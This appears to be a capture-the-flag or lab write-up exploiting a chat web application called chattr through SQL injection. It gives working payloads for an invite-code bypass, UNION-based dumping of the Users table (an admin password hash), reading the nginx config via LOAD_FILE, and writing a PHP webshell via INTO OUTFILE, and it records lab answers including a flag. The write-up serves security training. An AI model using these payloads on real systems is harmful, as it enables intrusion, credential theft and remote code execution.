>[!Info] Ensure Burpsuite is installed and enabled

>[!tip] There were no SQLi opportunities on the login page. 

### Question 1: What is the password hash for the user 'admin'?

The 'create an account' page has an invite code input box. The format is 
```go
abcd-efgh-1234
```

With Burp turned on, create your account and test SQLi via the invitation code
![[Pasted image 20260701233146.png]]

Send the POST request to the Repeater tab in Burp
![[Pasted image 20260701235457.png]]

This payload worked and created the account
```go
')OR+'1'='1'--+-
```

![[Pasted image 20260702000547.png]]


After logging in I'm taken to a page where I can begin a conversation with the following users. Select @admin and forward the request to the Repeater

![[Pasted image 20260702000938.png]]

Potential injection point via the `index.php?u=1`
![[Pasted image 20260703074946.png]]

I selected the user to converse with, admin, and in the search bar submitted "testingtesting". Which was captured in the `q` parameter. The `u=1` signifies admin. The q is the injection point as submitting the below returns a status of 200.

![[Pasted image 20260704221222.png]]

Submit this payload in the message input
```go
)+UNION+select+1,2,database(),@@version--+-
```

The database is chatter and the version is 10.11.11-MariaDB-0+deb12u1
![[Pasted image 20260704233951.png|451]]


This query injection gives us some table names
```go
')UNION+select+1,2,TABLE_NAME,TABLE_SCHEMA+from+INFORMATION_SCHEMA.TABLES+where+table_schema='chattr'--+-
```

![[Pasted image 20260704234134.png]]

Get the column names
```go
')UNION+select+1,2,COLUMN_NAME,TABLE_SCHEMA+from+INFORMATION_SCHEMA.COLUMNS+where+table_name='Users'--+-
```

Username and Password
![[Pasted image 20260704235134.png]]

Dump the data
```go
')UNION+select+1,2,username,password+from+chattr.Users--+-
```

![[Pasted image 20260704235532.png]]

Answer:
```go
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```


### Question 2: What is the root path of the web application?

To find the web root, find the default location for an nginx server 
```go
')+UNION+SELECT+1,2,LOAD_FILE("/etc/nginx/sites-available/default"),4--+-
```

![[Pasted image 20260705001956.png]]


Answer:
```go
/var/www/chattr-prod
```
### Question 3: ### Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.

Confirm backend access by writing a file to it
```go
')union+select+1,2,'file+written+successfully',4+into+outfile+'/var/www/chattr-prod/test.txt'--+-
```

![[Pasted image 20260705005336.png]]

Write the webshell
```go
')+union+select+"",'<?php+system($_REQUEST[0]);+?>',+"",+""+into+outfile+'/var/www/chattr-prod/shell.php'--+-
```

![[Pasted image 20260705011115.png]]


With the webshell in place, execute the below to get the flag.
![[Pasted image 20260705011155.png]]

Answer:
```go
061b1aeb94dec6bf5d9c27032b3c1d8d
```